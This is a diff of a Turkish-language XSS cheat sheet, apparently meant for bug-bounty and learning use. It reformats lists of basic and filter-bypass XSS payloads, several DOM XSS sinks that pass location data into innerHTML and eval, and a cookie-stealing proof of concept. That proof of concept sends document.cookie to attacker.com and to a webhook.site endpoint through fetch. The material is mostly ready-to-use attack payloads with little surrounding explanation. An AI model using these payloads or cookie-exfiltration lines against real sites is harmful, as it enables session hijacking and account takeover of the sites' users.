@@ -1,4 +1,4 @@
-**XSS (Cross-Site Scripting)**
+f**XSS (Cross-Site Scripting)**
 
 
 
@@ -22,64 +22,53 @@ DOM-basedSunucuya gitmez, client-side JS DOM'u güvensiz işler
 
 
 
-* html<script>alert(1)</script>
-* "<img src=x onerror=alert(1)>"
-* "<svg onload=alert(1)>"
-* "><script>alert(document.domain)</script>
-* javascript:alert(1)
+## Temel XSS Payload'ları
 
+* `<script>alert(1)</script>`
+* `<img src=x onerror=alert(1)>`
+* `<svg onload=alert(1)>`
+* `"><script>alert(document.domain)</script>`
+* `javascript:alert(1)`
 
+---
 
-**Filtre Atlatma Payload'ları**
+## Filtre Atlatma Payload'ları
 
+* `<ScRiPt>alert(1)</sCriPt>`
+* `<img/src="x"/onerror="alert(1)">`
+* `<svg/onload=alert(1)>`
+* `<details open ontoggle=alert(1)>`
+* `<body onload=alert(1)>`
+* `<iframe src="javascript:alert(1)">`
+* `" autofocus onfocus=alert(1) x="`
+* `%3Cscript%3Ealert(1)%3C%2Fscript%3E`
+* `&#60;script&#62;alert(1)&#60;/script&#62;`
 
+---
 
-* html<!-- Tag/attribute filtreleme atlatma -->
-* <ScRiPt>alert(1)</sCriPt>
-* <img/src="x"/onerror="alert(1)">
-* <svg/onload=alert(1)>
-* <details open ontoggle=alert(1)>
-* <body onload=alert(1)>
-* <iframe src="javascript:alert(1)">
-* <!-- Event handler tabanlı, tag gerekmeyen -->" autofocus onfocus=alert(1) x="
-* <!-- Encode edilmiş -->%3Cscript%3Ealert(1)%3C%2Fscript%3E
-* \&#60;script\&#62;alert(1)\&#60;/script\&#62;
+## DOM XSS — Tipik Zafiyetli Sink'ler
 
+`document.getElementById("output").innerHTML = location.hash.substring(1);`
 
+URL:
 
-**DOM XSS — Tipik Zafiyetli Sink'ler**
+`site.com/page#<img src=x onerror=alert(1)>`
 
+`eval(decodeURIComponent(location.search.split('=')[1]));`
 
+URL:
 
-javascript// innerHTML, document.write, eval gibi fonksiyonlar tehlikeli sink'lerdir
+`site.com/page?q=alert(1)`
 
-document.getElementById("output").innerHTML = location.hash.substring(1);
+---
 
-// URL: site.com/page#<img src=x onerror=alert(1)>
+## Cookie / Session Çalma PoC
 
+`<script>fetch('https://attacker.com/log?c=' + document.cookie)</script>`
 
+Bug bounty raporlarında etki kanıtlamak amacıyla kullanılabilir.
 
-eval(decodeURIComponent(location.search.split('=')\[1]));
-
-// URL: site.com/page?q=alert(1)
-
-
-
-**Cookie / Session Çalma PoC**
-
-
-
-html<script>
-
-fetch('https://attacker.com/log?c=' + document.cookie)
-
-</script>
-
-
-
-<!-- Bug bounty raporunda etki kanıtlamak için kullanılır -->
-
-<img src=x onerror="fetch('https://webhook.site/UNIQUE\_ID?cookie='+document.cookie)">
+`<img src=x onerror="fetch('https://webhook.site/UNIQUE_ID?cookie='+document.cookie)">`
 
 
 
